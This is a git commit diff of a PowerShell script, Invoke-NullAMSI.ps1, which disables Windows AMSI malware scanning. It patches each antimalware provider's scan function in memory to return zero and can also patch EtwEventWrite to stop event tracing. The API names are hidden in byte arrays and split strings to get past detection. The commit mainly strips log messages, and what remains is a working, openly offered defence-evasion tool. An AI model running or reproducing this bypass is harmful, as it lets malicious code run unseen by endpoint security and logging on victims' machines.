c8dbdf76c92ecc359eda42387aa42cdd0346a8d5
LazyTitan <80063008+LazyTitan33@users.noreply.github.com>
2025-12-11 16:42:41 +0200

    Refactor AMSI bypass functions
    Refactor and optimize the AMSI bypass functions for improved clarity and performance.

--- Invoke-NullAMSI.ps1
+++ Invoke-NullAMSI.ps1
@@ -24,7 +24,6 @@ function Get-Delegate
     $delegate = $type.CreateType()
     $marshalClass::("GetDelegate" +"ForFunctionPointer")($funcAddr, $delegate)
 }
-Write-host "[*] Patching 4MSI" -ForegroundColor Cyan
 try {
     Add-Type -AssemblyName System.Windows.Forms
 }
@@ -41,23 +40,18 @@ $GetModule = $unsafeMethodsType.GetMethod($GetMod)
 if ($GetModule -eq $null) {
     Throw "[!] Error getting the $GetMod address"
 }
-Write-Verbose "[*] Handle of ${GetMod}: $($GetModule.MethodHandle.Value)"
 $GetAddres = $unsafeMethodsType.GetMethod($GetProc)
 if ($GetAddres -eq $null) {
     Throw "[!] Error getting the $GetProc address"
 }
-Write-Verbose "[*] Handle of ${GetProc}: $($GetAddres.MethodHandle.Value)"
 $bytes4msiInit = [Byte[]](65, 109 , 115, 105, 73, 110, 105, 116, 105, 97, 108, 105, 122, 101)
 $bytes4msi = [Byte[]](97, 109, 115, 105, 46, 100, 108, 108)
 $4msi = [System.Text.Encoding]::ASCII.GetString($bytes4msi)
 $4msiInit = [System.Text.Encoding]::ASCII.GetString($bytes4msiInit)
-
 $4msiAddr = Get-Function $4msi $4msiInit
 if ($4msiAddr -eq $null) {
     Throw "[!] Error getting the $4msiInit address"
 }
-Write-Verbose "[*] Handle of ${4msiInit}: $4msiAddr"
-Write-Verbose "[*] Getting $4msiInit delegate"
 $PtrSize = $marshalClass::SizeOf([Type][IntPtr])
 if ($PtrSize -eq 8) {
     $Initialize = Get-Delegate $4msiAddr @([string], [UInt64].MakeByRefType()) ([Int])
@@ -72,22 +66,17 @@ $protectAddr = Get-Function ("ker{0}.dll" -f "nel32") $name
 if ($protectAddr -eq $null) {
     Throw "[!] Error getting the $name address"
 }
-Write-Verbose "[*] Handle of ${name}: $protectAddr"
 $protect = Get-Delegate $protectAddr @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])
-Write-Verbose "[*] Getting $name delegate"
 $PAGE_EXECUTE_WRITECOPY = 0x00000080
 $patch = [byte[]] (184, 0, 0, 0, 0, 195)
 $p = 0; $i = 0
-Write-Verbose "[*] Calling $4msiInit to recieve a new AMS1 Context"
 if ($Initialize.Invoke("Scanner", [ref]$ctx) -ne 0) {
     if ($ctx -eq 0) {
-        Write-Host "[!] No provider found" -ForegroundColor Red
         return
     } else {
         Throw "[!] Error call $4msiInit"
     }
 }
-Write-host "[*] AMS1 context: $ctx" -ForegroundColor Cyan
 if ($PtrSize -eq 8) {
     $CAmsiAntimalware = $marshalClass::ReadInt64([IntPtr]$ctx, 16)
     $AntimalwareProvider = $marshalClass::ReadInt64([IntPtr]$CAmsiAntimalware, 64)
@@ -95,7 +84,6 @@ if ($PtrSize -eq 8) {
     $CAmsiAntimalware = $marshalClass::ReadInt32($ctx+8)
     $AntimalwareProvider = $marshalClass::ReadInt32($CAmsiAntimalware+36)
 }
-Write-Verbose "[*] Patching all the providers"
 while ($AntimalwareProvider -ne 0)
 {
     if ($PtrSize -eq 8) {
@@ -105,8 +93,6 @@ while ($AntimalwareProvider -ne 0)
         $AntimalwareProviderVtbl = $marshalClass::ReadInt32($AntimalwareProvider)
         $AmsiProviderScanFunc = $marshalClass::ReadInt32($AntimalwareProviderVtbl + 12)
     }
-    Write-Verbose "[*] Changing address $AmsiProviderScanFunc permissions to PAGE_EXECUTE_WRITECOPY"
-    Write-host "[$i] Provider's scan function found: $AmsiProviderScanFunc" -ForegroundColor Cyan
     if (!$protect.Invoke($AmsiProviderScanFunc, [uint32]6, $PAGE_EXECUTE_WRITECOPY, [ref]$p)) {
         Throw "[!] Error changing the permissions of provider: $AmsiProviderScanFunc"
     }
@@ -122,7 +108,6 @@ while ($AntimalwareProvider -ne 0)
             Throw "[!] Error when patching in the address: $AmsiProviderScanFunc"
         }
     }
-    Write-Verbose "[*] Restoring original memory protection"
     if (!$protect.Invoke($AmsiProviderScanFunc, [uint32]6, $p, [ref]$p)) {
         Throw "[!] Failed to restore memory protection of provider: $AmsiProviderScanFunc"
     }
@@ -134,14 +119,11 @@ while ($AntimalwareProvider -ne 0)
     }
 }
 if ($etw) {
-    Write-host "[*] Patching ETW" -ForegroundColor Cyan
     $etwFunc = [Text.Encoding]::ASCII.GetString([Byte[]](69, 116, 119, 69, 118, 101, 110, 116, 87, 114, 105, 116, 101))
     $etwAddr = Get-Function ("nt{0}.dll" -f "dll") $etwFunc
-    Write-Verbose "[*] Handle of ${etwFunc}: $etwAddr"
     if ($etwAddr -eq $null) {
         Throw "[!] Error getting the $etwFunc address"
     }
-    Write-Verbose "[*] Changing $etwFunc permissions to PAGE_EXECUTE_WRITECOPY"
     if (!$protect.Invoke($etwAddr, 1, $PAGE_EXECUTE_WRITECOPY, [ref]$p)) {
         Throw "[!] Error changing the permissions $etwFunc"
     }
@@ -157,7 +139,6 @@ if ($etw) {
          Throw "[!] Error writing patch $etwFunc"
     }
     
-    Write-Verbose "[*] Restoring original memory protection"
     if (!$protect.Invoke($etwAddr, 1, $p, [ref]$p)) {
         Throw "[!] Failed to restore memory protection of $etwFunc"
     }
@@ -174,27 +155,4 @@ if ($etw) {
         }
     }
     }
-    Write-Host "[*] Successful ETW patching" -ForegroundColor Green
 }
-
-function Invoke-Bypass {
-    param
-    (
-        [Parameter(ParameterSetName = 'Interface',
-                   Mandatory = $false,
-                   Position = 0)]
-        [switch]
-        $v,
-        [Parameter(ParameterSetName = 'Interface',
-                   Mandatory = $false,
-                   Position = 0)]
-        [switch]
-        $etw
-    )
-    if ($v) {
-        $VerbosePreference="Continue"
-    }
-    Write-Host "[*] Successful providers patching, 4MSI patched" -ForegroundColor Green
-}
-Invoke-Bypass
-
